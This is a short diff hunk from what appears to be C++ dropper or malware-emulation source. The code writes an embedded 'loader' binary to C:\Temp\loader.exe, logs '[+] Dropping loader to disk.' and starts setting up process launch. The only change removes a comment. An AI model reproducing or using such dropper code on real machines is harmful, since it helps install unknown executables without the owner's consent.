@@ -19,7 +19,7 @@ int wmain() {
 	// write the loader to disk
 	Log("[+] Dropping loader to disk.", componentName);
 	std::ofstream outfile("C:\\Temp\\loader.exe", std::ios::out | std::ios::binary);
-	outfile.write(&loader[0], sizeof(loader)); // try catch?
+	outfile.write(&loader[0], sizeof(loader));
 	outfile.close();
 
 	STARTUPINFOW si;
